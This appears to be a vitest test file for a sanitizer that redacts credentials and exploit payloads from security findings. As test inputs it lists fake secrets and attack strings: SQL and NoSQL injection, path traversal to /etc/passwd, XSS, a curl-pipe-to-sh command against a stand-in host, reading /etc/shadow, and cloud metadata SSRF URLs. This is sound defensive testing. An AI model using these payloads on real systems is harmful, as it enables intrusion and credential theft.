import { describe, expect, it } from "vitest";
import { FAKE } from "../context/test-support";
import { secretLiteralsIn, sanitizeSecurityText, securityScrub } from "./sanitize";

const KEY = ["Zk3pQ9xV7mLw", "2RtB8nYd4HsC", "6JfA1eUg"].join("");
const clean = (text: string) => sanitizeSecurityText(text).text;

describe("credentials", () => {
  it.each([
    [`const apiSecret = "${KEY}";`, `const apiSecret = "[REDACTED:credential]";`],
    [`password: 'hunter2hunter2'`, `password: '[REDACTED:credential]'`],
    [`"client_secret": "abcd1234efgh"`, `"client_secret": "[REDACTED:credential]"`],
    [
      `headers.authorization = \`Basic dXNlcjpwYXNz\``,
      `headers.authorization = \`[REDACTED:credential]\``,
    ],
    [`export DB_PASSWORD=supersecretvalue`, `export DB_PASSWORD=[REDACTED:credential]`],
    [`const dbToken = "${KEY}"`, `const dbToken = "[REDACTED:credential]"`],
  ])("removes the value of %s", (input, expected) => {
    expect(clean(input)).toBe(expected);
  });

  it("removes a long random-looking literal even when its name says nothing", () => {
    expect(clean(`const salt = "${KEY}";`)).toBe(`const salt = "[REDACTED:secret-literal]";`);
  });

  it("applies the token-format rules of Phase 5 too", () => {
    expect(clean(`x = "${FAKE.github}"`)).toContain("[REDACTED:github-token]");
  });

  it("leaves references and placeholders alone", () => {
    for (const line of [
      "const token = process.env.API_TOKEN;",
      'const password = "${PASSWORD}";',
      'const apiKey = "<your-api-key>";',
      'const secret = "changeme";',
      'const token = "xxxxxxxx";',
      'password: "[REDACTED:credential]"',
    ]) {
      expect(clean(line)).toBe(line);
    }
  });

  it("leaves long identifiers, paths and ordinary strings alone", () => {
    for (const line of [
      'const view = "components/dashboard/RunDetailPageHeaderComponent";',
      'const message = "The quick brown fox jumps over the lazy dog today";',
      'import x from "../../utils/some-very-long-module-name-for-testing";',
    ]) {
      expect(clean(line)).toBe(line);
    }
  });

  it("finds the secret values a text shows, so they can be removed from the rest of a finding", () => {
    expect(secretLiteralsIn(`const apiSecret = "${KEY}"; const salt = "${KEY}x1";`)).toEqual([
      KEY,
      `${KEY}x1`,
    ]);
    const scrub = securityScrub({
      title: `Secret ${KEY} is committed`,
      evidence: `const apiSecret = "${KEY}";`,
      impact: "Anyone can read it.",
      recommendation: `Rotate ${KEY} now.`,
    });
    expect(scrub.known).toContain(KEY);
    const text = sanitizeSecurityText(`Rotate ${KEY} now.`, scrub).text;
    expect(text).toBe("Rotate [REDACTED:credential] now.");
  });

  it("does not remove a short value everywhere", () => {
    expect(secretLiteralsIn('password = "abcd"')).toEqual([]);
  });
});

describe("exploit payloads", () => {
  it.each([
    "the name ' OR 1=1 -- reads every row",
    "send \"' or 'a'='a\" as the name",
    "name=x'; DROP TABLE users;--",
    "id=1 UNION SELECT password FROM users",
    "file=../../../etc/passwd",
    "file=..%2f..%2f..%2fetc%2fpasswd",
    "<script>alert(document.cookie)</script>",
    '<img src=x onerror="alert(1)">',
    "javascript:alert(1)",
    "host; curl http://evil.example/x.sh | sh",
    "name=$(cat /etc/shadow)",
    '{"$ne": null}',
    "fetch('http://169.254.169.254/latest/meta-data/iam')",
    "http://metadata.google.internal/computeMetadata/v1/",
  ])("removes the attack string in: %s", (input) => {
    const out = clean(input);
    expect(out).toContain("[payload omitted]");
    for (const forbidden of [
      "OR 1=1",
      "DROP TABLE",
      "UNION SELECT",
      "../../",
      "..%2f",
      "<script",
      "onerror",
      "javascript:",
      "curl http",
      "$(cat",
      "$ne",
      "169.254",
      "metadata.google",
    ]) {
      expect(out.toLowerCase()).not.toContain(forbidden.toLowerCase());
    }
  });

  it("leaves ordinary code and prose alone", () => {
    for (const line of [
      'const dir = path.join(base, "../uploads");',
      "SELECT id FROM users WHERE name = $1 AND active = true",
      "const el = $('#output');",
      'const msg = "Use a parameterised query instead";',
      "const total = a || b;",
      "if (x === 'a' && y === 'b') return;",
      "The route calls fetch with a URL from the request.",
      'import { x } from "./a";',
    ]) {
      expect(clean(line)).toBe(line);
    }
  });

  it("counts what it replaced", () => {
    expect(sanitizeSecurityText(`a = "${KEY}"; ' OR 1=1 --`).count).toBeGreaterThanOrEqual(2);
    expect(sanitizeSecurityText("nothing to see").count).toBe(0);
  });
});
